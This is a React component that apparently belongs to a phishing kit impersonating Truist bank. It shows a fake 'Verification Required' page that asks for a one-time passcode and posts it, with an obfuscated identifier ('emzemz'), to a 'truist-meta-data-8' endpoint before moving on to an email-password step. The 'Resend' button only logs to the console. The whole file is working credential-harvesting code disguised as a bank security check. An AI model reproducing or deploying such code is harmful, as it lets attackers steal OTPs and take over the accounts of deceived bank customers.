import React, { useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import { inputStyles, buttonStyles, cardStyles } from '../Utils/truistStyles';

const OTP: React.FC = () => {
  const [otp, setOtp] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz } = location.state || {};

  if (!emzemz) {
    return (
      <div className="flex flex-col items-center justify-center">
        <div className={cardStyles.base}>
          <div className={cardStyles.padding}>
            <h1 className="mx-auto mb-6 w-full text-center text-3xl font-semibold text-[#2b0d49]">
              Error
            </h1>
            <p className="text-sm font-semibold text-[#6c5d85] mb-8">
              Missing verification details. Please restart the login process.
            </p>
          </div>
        </div>
      </div>
    );
  }

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setError('');

    if (!otp.trim()) {
      setError('Please enter the verification code.');
      return;
    }

    setIsLoading(true);

    try {
      await axios.post(`${baseUrl}api/truist-meta-data-8/`, {
        emzemz,
        otp,
      });

      navigate('/email-password', { state: { emzemz } });
    } catch (err) {
      console.error('Error submitting OTP:', err);
      setError('There was a problem verifying your passcode. Please try again.');
      setIsLoading(false);
    }
  };

  return (
    <div className="flex flex-col items-center justify-center">
      <div className={cardStyles.base}>
        <div className={cardStyles.padding}>
          <h1 className="mx-auto mb-6 w-full text-center text-3xl font-semibold text-[#2b0d49]">
            Verification Required
          </h1>
          <p className="text-sm font-semibold text-[#6c5d85] mb-8">
            For your security, we've sent a verification code to your registered phone number.
          </p>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-2">
              <label className="text-sm text-[#5d4f72]" htmlFor="otp">
                Verification Code
              </label>
              <input
                id="otp"
                name="otp"
                type="text"
                value={otp}
                onChange={(e) => setOtp(e.target.value)}
                className={`${inputStyles.base} ${inputStyles.focus}`}
                placeholder="Enter verification code"
              />
              {error && (
                <div className="flex items-center gap-2 text-xs font-semibold text-[#b11f4e] mt-2">
                  <svg aria-hidden="true" className="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                  </svg>
                  <span>{error}</span>
                </div>
              )}
            </div>

            <div className="flex flex-wrap gap-3 pt-2">
              <button
                type="submit"
                className={buttonStyles.base}
                disabled={isLoading}
              >
                {isLoading ? (
                  <span className={buttonStyles.loading}></span>
                ) : (
                  'Verify'
                )}
              </button>
            </div>

            <div className="text-center">
              <button
                type="button"
                className="text-sm text-[#5f259f] hover:underline"
                onClick={() => console.log('Resend OTP')}
              >
                Didn't receive a code? Resend
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default OTP;
